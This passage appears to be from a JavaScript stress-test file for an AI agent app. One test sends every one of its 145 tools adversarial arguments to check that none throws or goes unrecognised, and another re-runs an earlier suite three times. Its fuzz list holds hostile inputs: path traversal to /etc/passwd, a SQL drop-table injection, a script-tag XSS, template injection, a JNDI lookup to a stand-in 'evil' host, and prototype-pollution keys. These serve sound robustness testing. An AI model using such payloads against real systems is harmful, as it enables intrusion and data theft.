test('TOOL-STORM: all 145 tools dispatched with adversarial args — zero uncaught throws, zero Unknown tool', { timeout: 300_000 }, async () => {
  process.env.SURNIA_NO_BROWSER = '1';
  process.env.SURNIA_SKIP_UI_GATE = '1';
  const toolsPath = join(tmp, 'tools-adv.cjs');
  bundle('electron/agent/tools.ts', toolsPath);
  const tools = require(toolsPath);
  const defs = tools.getToolDefs([]);
  const TOOL_COUNT = defs.length;
  assert.equal(TOOL_COUNT, 145, `live registry has 145 tools (got ${TOOL_COUNT})`);

  const stormWs = join(tmp, 'storm-ws');
  mkdirSync(stormWs, { recursive: true });
  writeFileSync(join(stormWs, 'probe.txt'), 'stress fixture\n');

  // Tools whose args could spawn processes / hit the network / do heavy work
  // are driven with {} so they refuse fast and honestly.
  const FORCE_EMPTY = new Set([
    'run_background', 'process_output', 'stop_process', 'process_kill', 'process_list',
    'debug_start', 'debug_state', 'debug_eval', 'debug_step', 'debug_stop',
    'test_run', 'lint_check', 'env_install', 'export_project', 'env_probe', 'env_manager', 'network_info', 'port_probe', 'sys_info',
    'web_search', 'search_web', 'image_search', 'web_fetch', 'http_request', 'web_download',
    'download_file', 'browser_download', 'archive_create', 'archive_extract',
    'pdf_make', 'pdf_read', 'docx_make', 'xlsx_make', 'pptx_make', 'media_ffmpeg',
    'image_generate', 'image_edit', 'e2e_run', 'lighthouse', 'a11y_audit', 'git_platform',
    'db_query', 'db_seed', 'db_migrate', 'sqlite_query', 'create_pull_request', 'pr_status',
    'preview', 'preview_screenshot', 'gen_ui', 'screenshot', 'desktop_control',
    'notify_user', 'open_path', 'reveal_in_folder', 'device_launch_app',
    'run_command', 'browser_navigate', 'browser_snapshot', 'browser_click',
    'browser_type', 'browser_read', 'browser_screenshot', 'browser_eval',
    'browser_wait_for', 'browser_select', 'browser_console', 'browser_console_eval',
    'browser_close', 'browser_network', 'browser_tabs', 'browser_pdf', 'task', 'checkpoint_restore',
  ]);

  function stormCtx(deny) {
    const approvals = [];
    return {
      workspace: stormWs, sessionId: 'v1116-tool-storm', mcpServers: [],
      emit() {},
      approve: async (req) => { approvals.push(req?.kind ?? '?'); return !deny; },
      fullAccess: false,
      denyHint: deny ? 'stress harness: read-only (auto-denied)' : undefined,
      approvals,
    };
  }

  const ADV_STRINGS = [
    '../../etc/passwd\0', '{{7*7}}', "'; DROP TABLE users;--", 'a'.repeat(5000),
    '🙂'.repeat(40), '__proto__', 'constructor', '<script>alert(1)</script>',
    '\u202e\u202d', 'http://127.0.0.1:9/?x=' + 'A'.repeat(2000), '', ' ', '\r\n\r\n',
    '${jndi:ldap://evil/x}', ' ', '﻿', '\\\\?\\C:\\nul',
  ];
  const ADV_NUMS = [-1, 0, 1e309, Number.MAX_SAFE_INTEGER, -0];
  let advI = 0;
  function advValue(key, sch) {
    const lk = String(key).toLowerCase();
    const t = sch?.type;
    const pick = () => ADV_STRINGS[(advI++) % ADV_STRINGS.length];
    if (t === 'integer' || t === 'number') return ADV_NUMS[(advI++) % ADV_NUMS.length];
    if (t === 'boolean') return (advI++ % 2) === 0;
    if (t === 'array') return [pick(), { nested: pick() }, null];
    if (t === 'object') return { weird: pick(), __proto__: { polluted: true } };
    if (/path|file|dir|db|dest|archive|program|image|input|workspace|folder/.test(lk)) return join(stormWs, pick().replace(/[\\/:*?"<>|\0]/g, '_').slice(0, 40));
    if (/url|uri|endpoint|host/.test(lk)) return 'http://127.0.0.1:9/' + encodeURIComponent(pick().slice(0, 30));
    if (/sql/.test(lk)) return pick();
    if (/command|cmd|expression|code|script/.test(lk)) return 'echo ' + pick().slice(0, 20);
    if (/ref|index|line|character|count|ms|limit|offset|pid|id|port|n$|number/.test(lk)) return ADV_NUMS[(advI++) % ADV_NUMS.length];
    return pick();
  }
  function advArgs(def, round) {
    const p = def.parameters ?? {};
    const props = p.properties ?? {};
    const req = Array.isArray(p.required) ? p.required : [];
    const out = {};
    const keys = round === 'empty' ? [] : [...new Set([...req, ...Object.keys(props).slice(0, 4)])];
    for (const k of keys) out[k] = advValue(k, props[k] ?? {});
    if (round === 'max') {
      // adversarial extra keys incl. prototype-pollution attempts (own props)
      for (const k of ['__proto__', 'constructor', 'prototype', 'toString']) {
        Object.defineProperty(out, k, { value: ADV_STRINGS[(advI++) % ADV_STRINGS.length], enumerable: true, writable: true, configurable: true });
      }
    }
    return out;
  }

  const rounds = [
    { label: 'empty/deny', deny: true, mode: 'empty' },
    { label: 'adversarial-minimal/deny', deny: true, mode: 'min' },
    { label: 'adversarial-max/allow', deny: false, mode: 'max' },
  ];
  const unknown = [], threw = [], invalidJson = [], failures = [];
  let ok = 0, refusal = 0, calls = 0;
  const t0 = Date.now();
  for (const round of rounds) {
    const ctx = stormCtx(round.deny);
    for (const def of defs) {
      const args = FORCE_EMPTY.has(def.name) ? {} : advArgs(def, round.mode);
      calls++;
      let res = null, err = null, ms = Date.now();
      try { res = await tools.executeTool(def.name, JSON.stringify(args), ctx); }
      catch (e) { err = e; }
      ms = Date.now() - ms;
      if (err) { threw.push(`${def.name}[${round.label}]: ${err.message}`); continue; }
      const out = res && typeof res.output === 'string' ? res.output : '';
      if (/^Unknown tool:/.test(out)) { unknown.push(`${def.name}[${round.label}]`); continue; }
      if (/Invalid JSON args/.test(out)) { invalidJson.push(`${def.name}[${round.label}]`); continue; }
      if (!out.length) { failures.push(`${def.name}[${round.label}]: empty output`); continue; }
      if (res.ok === true) ok++; else refusal++;
      if (ms > 8000) console.error(`[v1116] slow tool ${def.name}[${round.label}]=${ms}ms`);
    }
  }
  const durationMs = Date.now() - t0;
  console.error(`[v1116] TOOL-STORM: tools=${TOOL_COUNT} calls=${calls} ok=${ok} honestRefusal=${refusal} unknown=${unknown.length} threw=${threw.length} invalidJson=${invalidJson.length} otherFailures=${failures.length} durationMs=${durationMs}`);
  if (unknown.length) console.error('[v1116] unknown tools: ' + unknown.join(', '));
  if (threw.length) console.error('[v1116] throws: ' + threw.join(' | '));
  if (invalidJson.length) console.error('[v1116] invalid-json: ' + invalidJson.join(', '));
  if (failures.length) console.error('[v1116] other failures: ' + failures.join(' | '));
  assert.equal(calls, TOOL_COUNT * 3, `${TOOL_COUNT} tools × 3 rounds = ${TOOL_COUNT * 3} dispatches (got ${calls})`);
  assert.deepEqual(unknown, [], `zero "Unknown tool" responses: ${unknown.join(', ')}`);
  assert.deepEqual(threw, [], `zero uncaught throws: ${threw.join(' | ')}`);
  assert.deepEqual(invalidJson, [], `zero "Invalid JSON args" responses: ${invalidJson.join(', ')}`);
  assert.deepEqual(failures, [], `zero outright failures: ${failures.join(' | ')}`);
  assert.equal(ok + refusal, calls, 'every dispatch returned an ok or honest-refusal outcome');
  METRICS.toolStorm = { tools: TOOL_COUNT, calls, ok, refusal, unknown: unknown.length, threw: threw.length, durationMs };
  console.error('[v1116] TOOL-STORM-PASS ' + JSON.stringify(METRICS.toolStorm));
});

// ============================================================
// 5. V1115-STABILITY — full v1115 stress suite re-run 3x.
// ============================================================
test('V1115-STABILITY: full v1115 stress suite re-run 3 times — report stability', { timeout: 900_000 }, () => {
  const suite = join(ROOT, 'tests', 'v1115-stress.test.mjs');
  const markers = ['CONTINUITY-ALL-PASS', 'LONG-RUN-PASS', 'TOOL-STORM-PASS', 'MALFORMED-EVENTS-PASS'];
  const runs = [];
  // Strip the parent test-runner's context env — otherwise the child believes
  // it is already a test child and exits immediately without running anything.
  const childEnv = { ...process.env, V1115_DEBUG: '' };
  delete childEnv.NODE_TEST_CONTEXT;
  delete childEnv.NODE_OPTIONS;
  for (let i = 1; i <= 3; i++) {
    const t0 = Date.now();
    const res = spawnSync(process.execPath, ['--test', '--test-force-exit', suite], {
      cwd: ROOT, encoding: 'utf8', timeout: 600_000,
      env: childEnv,
      maxBuffer: 32 * 1024 * 1024,
    });
    const durationMs = Date.now() - t0;
    const out = `${res.stdout ?? ''}\n${res.stderr ?? ''}`;
    const found = markers.filter((m) => out.includes(m));
    const code = res.status ?? (res.error ? -1 : -99);
    const failures = (out.match(/not ok \d+/g) ?? []).length;
    runs.push({ run: i, exitCode: code, durationMs, markers: found.length, failedAssertions: failures });
    console.error(`[v1116] V1115 run ${i}: exit=${code} duration=${durationMs}ms markers=${found.length}/4 failedAssertions=${failures}`);
    if (code !== 0 || found.length !== 4) {
      // Persist the FULL child log for post-mortem (outside the repo, approved temp dir).
      try { writeFileSync(join(tmpdir(), `v1116-v1115-run-${i}-${Date.now()}.log`), out); } catch { /* ignore */ }
      const notOkIdx = out.indexOf('not ok ');
      const detail = notOkIdx >= 0 ? out.slice(notOkIdx, notOkIdx + 4000) : out.split('\n').slice(-80).join('\n');
      console.error(`[v1116] V1115 run ${i} FAILING BLOCK:\n${detail}`);
    }
    assert.equal(code, 0, `v1115 run ${i} exited ${code} (stderr tail above)`);
    assert.equal(found.length, markers.length, `v1115 run ${i} emitted all 4 PASS markers (got ${found.join(',')})`);
  }
  METRICS.v1115Stability = { runs, stable: runs.every((r) => r.exitCode === 0 && r.markers === 4) };
  console.error('[v1116] V1115-STABILITY-SUMMARY ' + JSON.stringify(METRICS.v1115Stability));
  assert.ok(METRICS.v1115Stability.stable, 'all 3 v1115 runs stable (exit 0 + 4 PASS markers)');
});

after(() => {
  for (const k of [
    'SURNIA_SSE_IDLE_MS', 'SURNIA_ENGINE_IDLE_MS', 'SURNIA_TURN_RETRY_DELAYS_MS',
    'SURNIA_DELTA_FLUSH_MS', 'SURNIA_HOME', 'SURNIA_SKIP_UI_GATE', 'SURNIA_NO_BROWSER',
  ]) delete process.env[k];
  console.error('===V1116-METRICS-START===' + JSON.stringify(METRICS) + '===V1116-METRICS-END===');
  try { rmSync(tmp, { recursive: true, force: true }); } catch { /* ignore */ }
});
